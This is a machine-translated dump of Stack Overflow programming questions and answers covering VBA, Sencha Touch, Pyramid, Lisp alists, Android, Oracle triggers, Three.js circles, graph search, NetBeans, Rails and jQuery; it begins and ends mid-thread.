我会使用文件脚本对象来读取文本文件。此示例使用后期绑定，但您也可以提前绑定它。读取变量然后将该变量设置为输出范围会更有效。

```
Sub ImportTextFile()
   Dim rPath As String, rFileName As String, fs As Object, fsFile As Object, iLine As Integer

   rPath = Sheet1.Range("C9")
   rFileName = Sheet1.Range("C10")
   Range("G8").CurrentRegion.Offset(1, 0).Clear

   'Use filescripting object to open the file on Windows
   Set fs = CreateObject("Scripting.FileSystemObject")
   Set fsFile = fs.OpenTextFile(rPath & "\" & rFileName, 1, False)

    'Loop through the file
   Do While fsFile.AtEndOfStream <> True
       iLine = iLine + 1

       Sheet1.Cells(iLine + 8, 1) = VBA.Split(fsFile.ReadLine, vbTab)
   Loop

   Set fs = Nothing
   Set fsFile = Nothing
End Sub 
```

# javascript - Sencha Touch 2 数组解析

> ID：13756088
> 
> 赞同：0
> 
> 时间：2012-12-07T02:31:43.580
> 
> 标签：javascript, sencha-touch

我是 sencha touch 的新手，我正在尝试解析一组数据（这似乎不是一个不常见的用例，但我在网上找不到任何关于它的信息）。我在嵌套 json 上遵循了 sencha ext.data.reader.json 文档，但它不起作用。这是我的模型： 搜索结果（保存多个搜索结果）：

```
Ext.define('GS.model.SearchResults', {
extend: 'Ext.data.Model',
autoLoad: true,
config: {
    fields: [
        {name: 'query', type: 'string'},
    ],
    hasMany  : {model: 'SearchResult', name: 'results'},

        }
}); 
```

和搜索结果，保存一个单独的搜索结果

```
Ext.define('GS.model.SearchResult', {
extend: 'Ext.data.Model',

config: {
    fields: [
        {name: 'id',     type: 'int'},
        {name: 'name',      type: 'string'}
    ],
    belongsTo: 'SearchResults'
}
}); 
```

然后在我的控制器中，我有以下代码：

```
var store = Ext.create('Ext.data.Store', {
        autoLoad: "true",
        model: "GS.model.SearchResults",
        proxy: 
        {
            type: 'ajax',
            url : 'www.someurl.com/?query=somequery',
            reader: {
                type: 'json'
            }
        }
    });
    store.load({
        callback: function() {
            console.log("Done Loading");
            var root = store.first();

            console.log("Results for " + root.get('query')); //this prints correctly

            console.log(root.results());//THIS IS THE LINE IM INTERESTED IN
            console.log(root.raw.results);//this weirdly works
            //now I want to print each search results name
            root.results().each(function(result) {
                console.log("Song: " + result.get('name'));
            });

        }
    });

} 
```

当我记录 root.results() 时，我得到

> 未捕获的类型错误：对象 [对象对象] 没有方法“结果”

这正是他们在文档中的做法，所以有人知道为什么这不起作用？？？

编辑：这是我[关注的文档](http://docs.sencha.com/touch/2-0/#!/api/Ext.data.reader.Reader)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-16T21:49:41.257

After some painful trial and error, I figured it out. In the tutorial, they used unconventional model name, but in my case I needed to use the fully qualified one

So to fix I needed to change

```
hasMany  : {model: 'SearchResult', name: 'results'}, 
```

to

```
hasMany  : {model: 'GS.model.SearchResult', name: 'results'}, 
```

and same with my deeper model like this:

```
belongsTo: 'GS.model.SearchResults' 
```

Tough error to catch, but I hope this can help someone else in my position

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T04:40:17.860

检查错误的最佳方法是在 chrome 控制台中进行调试。回调后，您将在 root.raw 或 root.data 中找到您的记录。

我用来在 chrome 控制台中调试并编写所需的代码。

# python - 如何在 Pyramid 中制作几乎静态的网站？

> ID：13756090
> 
> 赞同：3
> 
> 时间：2012-12-07T02:32:00.973
> 
> 标签：python, pyramid

我正在从 Apache/PHP/Smarty/Dreamweaver 方案切换到 Pyramid。

我的意思是在 Apache 中具有通过 Dreamweaver 模板或其他静态工具实现的菜单的静态站点的情况。然后，如果我想在 html 中放入一些动态内容，我可以进行以下操作：

1.  将 smarty 模板放入 html 中。
2.  在具有相同名称的 html 后面创建 php。php 以 html 为模板。
3.  将链接从 html 更改为 php。

仅此而已。此方案很方便，因为该站点可以在浏览器中查看，并且可以在 Dreamweaver 中进行编辑。

如何在 Pyramid 中重现此方案？模板和静态内容有单独的目录。加上所有这些 myapp:static 修饰符在 hrefs 中。在哪里查找？

谢谢你的建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T17:52:52.630

1.  Python 没有 smarty 端口。所以你必须开始使用另一种模板语法，例如[mako](http://www.makotemplates.org/)或[chameleon](http://chameleon.repoze.org/)
2.  为此，您将设置您`view_config`的响应 url，并告诉它使用相应的模板。
3.  如果你想这样做，你可以简单地改变你的代码。但这不是必需的，pyramid 会处理您的请求，无论 url 是否包含 .html、.php、.python、/ 或其他任何内容。

我猜您仍然可以在 Dreamweaver 中编辑模板。

只有真正的静态页面才会使用`static_url`. 如果您打算将 html 制作成模板，那么直接从模板开始可能是最简单的，其中没有任何动态内容。

这是来自[URL 调度教程](http://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/tutorials/wiki2/definingviews.html)：

```
# in views.py
@view_config(route_name='view_page', renderer='templates/view.pt')
    def view_page(request): 
        return {}

# in __init__.py
config.add_route('view_page', 'mypage.html') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T23:11:04.413

您可以构建一个小型 Web 应用程序，该应用程序使用[遍历](http://pyramid.readthedocs.org/en/latest/narr/traversal.html)从目录中提供 html 文档。这里有更多关于[遍历如何工作](http://docs.pylonsproject.org/projects/pyramid/en/1.0-branch/narr/muchadoabouttraversal.html)的解释。

[然后，您可以使用PageTemplateFile](http://chameleon.repoze.org/docs/latest/library.html#chameleon.PageTemplateFile)以编程方式将这些文档呈现为 Chameleon 模板。这将允许您在每个页面中包含通用页眉/页脚/导航。

这意味着您网站中的每个页面实际上都是动态的，因此无论页面是否具有动态内容，都会对*每个*页面产生很小的性能损失，但除非您正在构建下一个脸书。:) 但是，这种方法将允许您拥有与网站中每个页面相对应的纯 html 文档，您可以使用 Dreamweaver 或任何其他编辑器对其进行编辑。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-25T11:59:23.327

这与其他答案有些不同，但这是一个完全不同的流程。

用 html 编写所有页面。一切！！！然后使用 angularjs 或 knockoutjs 之类的东西添加动态内容。Pyramid 将提供使用 ajax 请求的动态内容。

然后，您可以将所有内容映射到您的 html 模板......因为它们只是 html 文件，所以您可以在任何地方编辑这些模板。

不利的一面是，让它完全工作一开始并不是那么简单。

# lisp - lisp 中的好风格：缺点 vs 列表

> ID：13756104
> 
> 赞同：4
> 
> 时间：2012-12-07T02:34:00.370
> 
> 标签：lisp, scheme, common-lisp

将缺点用于成对的事物是一种好的风格，还是最好坚持使用列表？

比如问题和答案：

```
(list
    (cons
        "Favorite color?"
        "red")
    (cons
        "Favorite number?"
        "123")
    (cons
        "Favorite fruit?"
        "avocado")) 
```

我的意思是，有些事情自然而然地成对出现；不需要可以容纳两个以上的东西，所以我觉得缺点是自然的选择。但是，我也觉得我应该坚持一件事（列表）。

什么是更好或更容易接受的风格？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-07T04:24:02.090

你有一个[关联列表](http://en.wikipedia.org/wiki/Association_list)（alist）。实际上，Alist 条目通常是简单的 conses 而不是列表（尽管这是一个偏好问题：有些人也将列表用于 alist 条目），所以你所拥有的很好。不过，我通常更喜欢使用文字语法：

```
'(("Favorite color?" . "red")
  ("Favorite number?" . "123")
  ("Favorite fruit?" . "avocado")) 
```

[`assq`](http://www.schemers.org/Documents/Standards/R5RS/HTML/r5rs-Z-H-9.html#%_idx_434)列表通常使用符号作为键，因为符号是内嵌的，因此可以使用而不是查找符号列表[`assoc`](http://www.schemers.org/Documents/Standards/R5RS/HTML/r5rs-Z-H-9.html#%_idx_438)。以下是它的外观：

```
'((color . "red")
  (number . "123")
  (fruit . "avocado")) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-07T06:18:27.350

这种情况的默认数据结构应该是`HASH-TABLE`.

缺点对的关联列表也是一种可能的变体，并且在历史上被广泛使用。由于传统和简单，它是一个有效的变体。但是你不应该使用它，当对的数量超过几个时（可能，10 是一个很好的阈值），因为搜索时间是线性的，而在哈希表中它是恒定的。

也可以使用列表来完成此任务，但既丑陋又低效。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-07T09:54:00.763

您需要根据具体情况自行决定。没有一个普遍的答案。不同的任务对结构的工作方式不同。考虑以下：

*   在哈希表中搜索键会更快，然后在 alist 中。
*   使用 alist 时，使用迭代器并保存其状态更容易（哈希表需要将其所有键导出为数组或列表并具有指向该列表的指针，而只记住指向 alist 的指针，以便能够恢复迭代器的状态并继续迭代。
*   Alist vs list：考虑到所有其他字符都是原子，它们对偶数个元素使用相同数量的 conses。当使用列表与 alists 时，您必须确保没有奇数个元素（并且您可能发现它为时已晚），这很糟糕。
*   但是还有更多功能，包括内置功能，它们适用于正确的列表，而不适用于 alist。例如`nth`，如果 alist 命中`cdr`不是`list`.
*   有时某些宏不会像您希望的那样与 alist 一起使用，例如：

* * *

```
(destructuring-bind (a b c d) 
  '((100 . 200) (300 . 400)) 
   (format t "~&~{~s~^,~}" (list a b c d))) 
```

不会像您预期的那样工作。

*   另一方面，某些程序可能会被“欺骗”去做一些他们不会为正确的列表做的事情。例如，当使用 copy-list 复制 alist 时，只会重新复制`cdr`a的 conses `list`（取决于具体情况，这可能是所需的结果）。

# android - Android 移动应用数据库

> ID：13756105
> 
> 赞同：0
> 
> 时间：2012-12-07T02:34:02.000
> 
> 标签：android, database, mobile

我是移动应用程序开发的新手，因此有几个问题。

目前我所在的团队即将为 Ice Cream Sandwich (4.0) 操作系统开发一个 android 移动应用程序。此应用程序将使用户能够填写存储在手机上的数据库中的个人资料信息。但是，由于数据库存储来自用户的私人信息，因此它应该是私人的。

该应用程序的目的是利用用户的个人资料信息以及来自在线数据库的美国地理区域（地形、气候、植物群、动物群）的信息，以计算他们能够生存的情况给定的时间。

我计划在 Eclipse IDE 中使用 Android 开发工具插件。

所以我想问几个主要问题：

1.  我将使用 Java 开发工具中的什么来添加用户并将他们的个人资料信息输入到数据库中？换句话说，我将使用什么来与数据库通信？

2.  由于应用程序将从在线数据库中提取信息，因此需要某种方式来传输和使用该信息。我可以用什么来做到这一点？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T03:01:58.473

您可以查看一些库。

对于数据库交互（本地），[ORMLite](http://ormlite.com/)很好。这使您远离编写原始 SQL、为您处理转义等。它为您将数据库行映射到 POJO（顾名思义）。

对于远程数据，您需要一个 REST（或 SOAP？或 ??）客户端。目前尚不清楚远程数据存储是否属于您，或者如果是，您是否已创建它。如果它已经到位，那么您在这里的灵活性就会降低。

[Spring 框架](http://www.springsource.org/spring-framework)提供了几个[Android 库](http://www.springsource.org/spring-android)，其中一个用于使用 REST 服务，一个用于身份验证。我还看到有人提到泽西岛取得了成功。

如果您确实使用 REST，那么您将（可能）处理 JSON。[杰克逊](http://wiki.fasterxml.com/JacksonDocumentation)和[格森](http://code.google.com/p/google-gson/)是这里的两个主要竞争者。两者都提供 POJO 和 JSON 之间的自动（反）序列化。我用过Jackson，下次我可能会尝试Gson。虽然 Jackson 很好，但我发现文档有点零散且难以理解。是的。

我最新的项目结合使用了 ORMLite、Spring 的 REST 库和 Jackson，效果非常好。

要点是：定义一些模型类，用 Jackson 的一些东西和 ORMLite 的一些东西来注释类和它们的字段，将 Spring 指向你的端点。Spring 将检索 JSON，Jackson 将其解析为模型对象，然后您可以使用 ORMLite 将其持久化到本地数据库。在另一个方向，从你的数据库中提取一些东西（ORMLite 将模型对象交给你），将模型交给 Spring，它使用 Jackson 在发送数据之前对其进行序列化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T02:39:47.437

对于 1 和 2，您可以开发允许 android 应用程序与远程数据库通信以插入或检索甚至从数据库中删除记录的 Web 服务。

这是一个很好的教程，可以让您了解如何开始这样做。[请点击这里](http://www.c-sharpcorner.com/UploadFile/88b6e5/how-to-call-web-service-in-android-using-soap/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T02:43:13.413

阅读对 Android 的 SQLite 支持以及如何发出 HTTP 请求：

[http://developer.android.com/guide/topics/data/data-storage.html#db](http://developer.android.com/guide/topics/data/data-storage.html#db)

# oracle - 在错误编译的人员表中插入或删除时将行插入日志表的触发器

> ID：13756110
> 
> 赞同：0
> 
> 时间：2012-12-07T02:34:38.327
> 
> 标签：oracle, plsql

我有一个带有名称和 id 的个人表以及一个带有属性 who 和 what 的日志表。当我删除或插入人员表时，我想插入日志表。

这是我到目前为止所拥有的：

```
CREATE OR REPLACE TRIGGER add_del
  BEFORE INSERT OR DELETE ON persons
  FOR EACH ROW
  BEGIN
    IF INSERTING THEN
      INSERT INTO logs (who, what) VALUES (name, 'Insert into persons');
    ELSE
      INSERT INTO logs (who, what) VALUES (name, 'Delete from persons');
    END IF;
  END;
  / 
```

为什么编译时出现错误：

警告：使用编译错误创建触发器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T02:38:32.213

由于您没有发布错误，我不得不猜测。我的猜测是问题在于`name`在这种情况下它不是有效的标识符。您需要引用`:new.name`或`:old.name`。 `:old.name`将`NULL`在插入时`:new.name`将`NULL`在删除上，所以我假设您想要类似的东西

```
CREATE OR REPLACE TRIGGER add_del
  BEFORE INSERT OR DELETE ON persons
  FOR EACH ROW
BEGIN
  IF INSERTING THEN
    INSERT INTO logs (who, what) VALUES (:new.name, 'Insert into persons');
  ELSE
    INSERT INTO logs (who, what) VALUES (:old.name, 'Delete from persons');
  END IF;
END; 
```

# javascript - 用 Three.js 画一个圆（没有阴影）

> ID：13756112
> 
> 赞同：14
> 
> 时间：2012-12-07T02:34:39.060
> 
> 标签：javascript, three.js, geometry

我正在尝试绘制一个与[本](http://planetoweb.net/app/)网站上的轨道图案非常相似的圆圈。我想使用 Three.js 而不是纯 WebGL。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2014-02-12T23:29:15.113

三.js r50 添加`CircleGeometry`。它可以在[WebGL 几何示例](http://threejs.org/examples/#webgl_geometries)中看到（尽管有一张脸） 。

几何中的第一个顶点是在圆的中心创建的（在 r84 中，请参见[CircleGeometry.js 第 71 行](https://github.com/mrdoob/three.js/blob/r84/src/geometries/CircleGeometry.js#L71)，在 r65 中，请参见[CircleGeometry.js 第 18 行](https://github.com/mrdoob/three.js/blob/r65/src/extras/geometries/CircleGeometry.js#L18)），如果您要使用“完整的吃豆人”，这很不错”或“无信息饼图”的样子。哦，如果您要使用除`LineBasicMaterial`/之外的任何材料，这似乎是必要的`LineDashedMaterial`。

我已验证以下代码适用于 r60 和 r65：

```
var radius   = 100,
    segments = 64,
    material = new THREE.LineBasicMaterial( { color: 0x0000ff } ),
    geometry = new THREE.CircleGeometry( radius, segments );

// Remove center vertex
geometry.vertices.shift();

// Non closed circle with one open segment:
scene.add( new THREE.Line( geometry, material ) );

// To get a closed circle use LineLoop instead (see also @jackrugile his comment):
scene.add( new THREE.LineLoop( geometry, material ) ); 
```

PS：“文档”现在包含一个很好的`CircleGeometry`交互式示例：[https ://threejs.org/docs/#api/geometries/CircleGeometry](https://threejs.org/docs/#api/geometries/CircleGeometry)

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2013-12-19T23:04:08.290

在threejs 的较新版本中，API 略有变化。

```
var segmentCount = 32,
    radius = 100,
    geometry = new THREE.Geometry(),
    material = new THREE.LineBasicMaterial({ color: 0xFFFFFF });

for (var i = 0; i <= segmentCount; i++) {
    var theta = (i / segmentCount) * Math.PI * 2;
    geometry.vertices.push(
        new THREE.Vector3(
            Math.cos(theta) * radius,
            Math.sin(theta) * radius,
            0));            
}

scene.add(new THREE.Line(geometry, material)); 
```

根据场景的需要进行修改`segmentCount`以使圆更平滑或更锯齿。对于小圆圈，32 段将非常平滑。对于您链接的网站上的轨道，您可能需要几百个。

修改`Vector3`构造函数中三个组件的顺序以选择圆的方向。如此处给出的，圆将与 x/y 平面对齐。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-08T01:11:48.513

[我使用了这个 github 帖子](https://github.com/mrdoob/three.js/issues/98)中 Mr.doob 引用的代码。

```
var resolution = 100;
var amplitude = 100;
var size = 360 / resolution;

var geometry = new THREE.Geometry();
var material = new THREE.LineBasicMaterial( { color: 0xFFFFFF, opacity: 1.0} );
for(var i = 0; i <= resolution; i++) {
    var segment = ( i * size ) * Math.PI / 180;
    geometry.vertices.push( new THREE.Vertex( new THREE.Vector3( Math.cos( segment ) * amplitude, 0, Math.sin( segment ) * amplitude ) ) );         
}

var line = new THREE.Line( geometry, material );
scene.add(line); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-04-19T17:08:42.473

此示例在 Three.js 文档中：

```
var material = new THREE.MeshBasicMaterial({
    color: 0x0000ff
});

var radius = 5;
var segments = 32; //<-- Increase or decrease for more resolution I guess

var circleGeometry = new THREE.CircleGeometry( radius, segments );              
var circle = new THREE.Mesh( circleGeometry, material );
scene.add( circle ); 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2020-04-19T21:45:33.970

我不得不这样做大声笑：

```
function createCircle() {
    let circleGeometry = new THREE.CircleGeometry(1.0, 30.0);
    circleGeometry.vertices.splice(0, 1); //<= This.
    return new THREE.LineLoop(circleGeometry,
        new THREE.LineBasicMaterial({ color: 'blue' }));
}
let circle = createCircle(); 
```

**原因：**否则，它不会绘制“纯”圆，**即使您使用 LineLoop 而不是 Line** ，也会有一条从圆心到圆边缘的线。从数组中拼接（删除）第一个顶点是一种技巧，但似乎可以解决问题。:)

（请注意，显然，根据[mrienstra 的回答](https://stackoverflow.com/a/21742175/1599699)，“哦，如果您要使用 LineBasicMaterial / LineDashedMaterial 之外的任何材料，这似乎是必要的。”）

* * *

但是，如果您想要厚度，那[您就完蛋](https://stackoverflow.com/questions/11638883/thickness-of-lines-using-three-linebasicmaterial)了（[“由于大多数平台上带有 WebGL 渲染器的 OpenGL 核心配置文件的限制，无论设置值如何，线宽始终为 1。”](https://threejs.org/docs/#api/en/materials/LineBasicMaterial)）...除非您使用：[https： //github.com/spite/THREE.MeshLine](https://github.com/spite/THREE.MeshLine)

代码示例在这里：[https ://stackoverflow.com/a/61312721/1599699](https://stackoverflow.com/a/61312721/1599699)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-07T06:01:20.537

请参阅 three.js 示例[http://mrdoob.github.com/three.js/examples/webgl_lines_colors.html](http://mrdoob.github.com/three.js/examples/webgl_lines_colors.html)以了解如何绘制彩色线条。

像您引用的那样的圆圈被绘制为大的#小直线段。（其实你显示的可能是省略号）

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2014-04-24T13:27:38.500

```
var getStuffDashCircle2 = function () {

var segment = 100, radius = 100;

var lineGeometry = new THREE.Geometry();
var vertArray = lineGeometry.vertices;
var angle = 2 * Math.PI / segment;
for (var i = 0; i < segment; i++) {
    var x = radius * Math.cos(angle * i);
    var y = radius * Math.sin(angle * i);
    vertArray.push(new THREE.Vector3(x, y, 0));
}
lineGeometry.computeLineDistances();
var lineMaterial = new THREE.LineDashedMaterial({ color: 0x00cc00, dashSize: 4, gapSize: 2 });
var circle = new THREE.Line(lineGeometry, lineMaterial);

circle.rotation.x = Math.PI / 2;
circle.position.y = cylinderParam.trackHeight+20;
return   circle;
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-12-23T19:04:10.467

我在这里获得其他答案时遇到了一些问题——特别是`CircleGeometry`在圆的中心有一个额外的点，而且我不喜欢试图删除那个顶点的黑客行为。

[`EllipseCurve`](https://threejs.org/docs/#api/en/extras/curves/EllipseCurve)做我想要的（在 r135 中验证）：

```
const curve = new THREE.EllipseCurve(
  0.0, 0.0,            // Center x, y
  10.0, 10.0,          // x radius, y radius
  0.0, 2.0 * Math.PI,  // Start angle, stop angle
);

const pts = curve.getSpacedPoints(256);
const geo = new THREE.BufferGeometry().setFromPoints(pts);

const mat = new THREE.LineBasicMaterial({ color: 0xFF00FF });
const circle = new THREE.LineLoop(geo, mat);
scene.add(circle); 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2022-02-27T12:28:18.897

好吧，我不知道他们什么时候添加的——但是 TorusGeometry 应该可以完成这项工作…… [三个 TorusGeometry](https://threejs.org/docs/#api/en/geometries/TorusGeometry)[![三环面几何](../Images/b909638437bef0baa8874268ca4eae8f.png)](https://i.stack.imgur.com/0eEb9.png)

```
const geometry = new THREE.TorusGeometry( 10, 3, 16, 100 );
const material = new THREE.MeshBasicMaterial( { color: 0xffff00 } );
const torus = new THREE.Mesh( geometry, material );
scene.add( torus ); 
```

不知道，但我认为它不应该比生产线贵（很多），而且它是一种缓冲几何形状，您可以调整尺寸和材料等...

# c++ - 关于如何处理有向图的想法

> ID：13756113
> 
> 赞同：2
> 
> 时间：2012-12-07T02:34:39.200
> 
> 标签：c++, recursion, directed-graph

我正在尝试使用有向图（我知道但从未实现）编写一个程序来模拟交通网络。

用户将输入一个行星名称，后跟一个整数，表示图中的总节点数。然后用户将一个一个地遍历每个节点。他们会给它一个名字，给出节点的邻居数量，然后是具体的名字。输入将如下所示。

```
some_planet 4
node1 2 node2 node3
node2 1 node4
node3 1 node4
node4 1 node1 
```

然后我只输出 node1 无法到达的节点。但是，我对实现这一点有一些疑问。

1）大的正在存储这些东西。什么是简单的方法？我在考虑一个 LinkedList，并认为我会链接这些位置。然后我可以将指针弹出到它们对应于输入的任何内容。但是，我不知道如何做最后一部分。

2) 下一个大问题是搜索图表。我正计划进行递归深度优先搜索。你看到的这个算法有什么问题吗？我需要以这种方式单独搜索每个节点，所以我必须增加它。我可以把所有东西都放在一个 for 循环中吗？

```
recursive-d-first-search(graph G, node start, node find)
  if(start == find)
    return true;

  else
    for every neighbor n of start
      success = recursive-d-first-search(graph G, node n, node find);
      if(success)
        return true;

  return false; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:44:02.387

1.  我认为你只需要使用邻接矩阵来存储整个图的连接关系。在你的情况下，它应该是这样的：

    ```
     1    2    3    4

    1   0    1    1    0

    2   0    0    0    1

    3   0    0    0    1

    4   1    0    0    0 
    ```

2.  如果您使用邻接矩阵，我认为这`breadth-first search`可能是一个不错的选择，因为它易于理解和实现。同时，您需要一个队列来存储下一个要检查的节点，以及一个列表来存储哪些节点已经被检查

    例如，您想检查哪些节点`node1`无法到达，您只需检查第 1 行并查看它有`2`and `3`，然后将 and 放入`2`队列`3`。然后检查行`2`以查看它是否具有`4`，放入`2`列表并放入`4`队列。然后只需使用 for 循环来执行相同的操作。

    最后，您只需要检查哪些节点不在列表中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-09T00:06:03.407

如果您不想重新发明轮子，也可以使用[Boost::Graph ...](http://www.boost.org/doc/libs/1_52_0/libs/graph/doc/index.html)

# java - 在 NetBeans 中编写 Java：如何一次重命名所有出现的变量？

> ID：13756115
> 
> 赞同：2
> 
> 时间：2012-12-07T02:34:49.497
> 
> 标签：java, netbeans

我正在使用 NetBeans IDE 编写 Java。如何一次重命名所有出现的变量？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-07T02:44:54.667

以下是一次更改（重命名）所有这些突出显示的变量的方法：

[http://wiki.netbeans.org/重构](http://wiki.netbeans.org/Refactoring)

![在此处输入图像描述](../Images/f158177bee1bfd53700d71cdb3e3b6f0.png)

而且我不使用 Netbeans，但我相信这应该可以帮助您禁用出现标记（突出显示）：

`Options->Fonts & Colors -> Syntax, language: Java, Category: Mark Occurrences.`

从[这里](http://netbeans-org.1045718.n5.nabble.com/Turn-off-or-change-the-automatic-highlight-of-the-mark-occurrence-feature-td2949743.html)。

# javascript - 将 Javascript 添加到应用程序布局视图页面

> ID：13756116
> 
> 赞同：0
> 
> 时间：2012-12-07T02:35:04.007
> 
> 标签：javascript, ruby-on-rails, layout, view

我需要突出显示与当前页面相关的链接按钮。

在`apps/views/layouts/application.html.erb`：

```
<ul class="nav nav-tabs">
    <li class="link_style"><a href="/">link1</a></li>
    <li class="link_style"><a href="/about">link2</a></li>
    <li class="link_style"><a href="/posts">link3</a></li>
</ul> 
```

我打算将以下内容添加到某个`.js`文件中

```
$('li.link_style').on('click', function(){
    $(this).addClass('active'); // and then add active class for clicked element.
});​ 
```

我认为这会很好。但是，我不确定应该在哪个 .js 文件中添加 js 代码。我的猜测`/app/views/layouts/application.js.erb` 是我的方法对吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:17:09.780

指某东西的用途

```
$('li.link_style').on('click', function(){
   $(this).addClass('active'); // and then add active class for clicked element.
});​ 
```

但是不起作用，因为单击链接时将重新加载页面（和 JS）。更有用的东西可能是这样的：

```
$(document).ready(function() {
  $(".nav li.link_style").each(function(){
    var link = $(this).find($(a));
    if(window.location.pathname == link.attr("href")){
      link.addClass("active");
    }
  });
}); 
```

这将遍历 nav 类中的所有 li 元素，并将当前页面的路径与链接的 href 进行比较，如果它们匹配，则添加 active 类。您应该在 JS 文件的 $(document).ready(function() {} 部分中放置类似的内容。至于将其添加到哪个 JS 文件中，它可以是 Asset Pipeline (Rails 3.1) 中包含的任何内容+) 或您所说的 application.js。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T02:45:17.177

如果您使用 Rails 3.1 或更高版本应用程序的默认设置，您可以将其`.js`放在`app/assets/javascripts`. 请务必查看[Rails 资产管道指南](http://guides.rubyonrails.org/asset_pipeline.html)中的[资产组织部分](http://guides.rubyonrails.org/asset_pipeline.html#asset-organization)

# android - Android Show ProgressDialog onClick 的 AlertDialog

> ID：13756119
> 
> 赞同：1
> 
> 时间：2012-12-07T02:35:29.543
> 
> 标签：android, android-alertdialog, progressdialog, onclicklistener

我试图在 AlertDialog 的 onClick 事件中显示一个 ProgressDialog，代码有效，但 ProgressDialog 似乎卡在 AlertDialog 后面，这使这一点失败

```
public class MainActivity extends Activity
{
    @Override
    public void onCreate(Bundle savedInstanceState)
        {
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

    AlertDialog.Builder builder = new AlertDialog.Builder(this);
    builder.setTitle("Title").setMessage("Message").setPositiveButton("Yes", new DialogInterface.OnClickListener() {

        @Override
        public void onClick(DialogInterface dialog, int which) {

                    ProgressDialog pd = ProgressDialog.show(MainActivity.this, "Title", "Text", true, false); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:47:28.077

这种方法怎么样？

```
AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Title").setMessage("Progress?");
        builder.setPositiveButton("Yes", new OnClickListener() {

            @Override
            public void onClick(DialogInterface alertDialog, int which) {
                // TODO Auto-generated method stub
                alertDialog.dismiss();
                showProgressDlg();
            }
        });
        builder.show(); 
```

* * *

```
public void showProgressDlg()
    {
        ProgressDialog pDialog = new ProgressDialog(context);
        //All pd properties...
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-22T08:25:14.903

旧帖子，但我今天早上遇到了问题。

我试图把它放在一个`this.runOnUiThread(...)`但没有效果。`this`我尝试使用/的副本`MyActivity.this`，但没有。

诀窍（我不明白原因）：制作你的`ProgressDialog`类属性，不要从你的 AlertDialog 调用的方法中定义它`onClick`。

`private ProgressDialog pDialog;`

我的情况正是您的情况，现在可以了。也许它会帮助某人。

# asp.net-mvc - KnockoutMVC with Kendo UI Complete for MVC 这些可以集成服务器端吗

> ID：13756120
> 
> 赞同：3
> 
> 时间：2012-12-07T02:35:41.417
> 
> 标签：asp.net-mvc, kendo-ui, knockout-mvc

用于 knockout.js 的服务器端包装器[http://knockoutmvc.com/](http://knockoutmvc.com/) 和用于 ASP.NET MVC 的 Kendo UI 的服务器端包装器[http:](http://demos.kendoui.com/web/grid/index.html) //demos.kendoui.c​​om/web/grid/index.html 这些可以集成服务器端吗任何人都做过或有一个可行的例子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-27T07:09:15.800

是的，您可以使用服务器端包装器集成 Kendo 控件。

```
public static MvcHtmlString KEditorFor<TModel, TProperty>(this HtmlHelper<TModel> htmlHelper, Expression<Func<TModel, TProperty>> expression, string name, string value)
{
    string ms = htmlHelper.Kendo().Editor()
            .Name(name)
            .Value(value)
            .ToHtmlString();

    return MvcHtmlString.Create(ms);
} 
```

而在看来，

```
@Html.KEditorFor(model=>model.EditorValue, "EditorValue", Model.EditorValue) 
```

我不确定*KnockoutMVC*，但您也可以对其他*Kendo*控件执行此操作。

# php - 将时间 (HH:MM) 添加到 通过jquery标记

> ID：13756121
> 
> 赞同：2
> 
> 时间：2012-12-07T02:35:44.770
> 
> 标签：php, jquery, time

**您好，如何根据预定义的开始时间向 li 标签添加 HH:MM 时间？**

背景：我有一个舞蹈调度程序，它在无序列表中列出舞蹈条目。通过 jQuery UI，用户可以重新安排舞蹈套路，完成后，他们可以在一天的舞蹈日程中显示每个套路的时间安排。每个舞蹈程序的长度为 3、6 或 30 分钟，我将此长度存储在 li 标签的属性中（我知道不正确）。一天的开始时间是上午 8:00:00，我想根据每个例程的长度、之前的舞蹈例程和一天的开始来为每个例程添加时间。

这是我的循环中的 PHP li 代码示例，它打印出所有条目。我想将例程的时间存储在 span id='etimeXXX' 中。例如，我的循环中的以下代码：

```
<ul id="sortable2">
...

$step2 .= "<li id='e".$e[entry_id]."' class='cat entry' lang='$length'>\n"
. "<span class='entry_time' id='etime".$e[entry_id]."'></span>"
. strtoupper($performance_title)]
. "</li>\n";

...
</ul> 
```

...会输出类似：

*   8:03:00 AM 一闪一闪*   8:06:00 AM 天上的馅饼*   上午 8:09:00 挑战

我正在尝试使用类似以下内容来显示时间，但它不起作用：

```
function createDanceTimes() {   
    var start_time = new Date("March 1, 2013 08:00:00");

    var h = start_time.getHours();
    var m = start_time.getMinutes();

    var entry_length = 0;
    var cur_time = m;

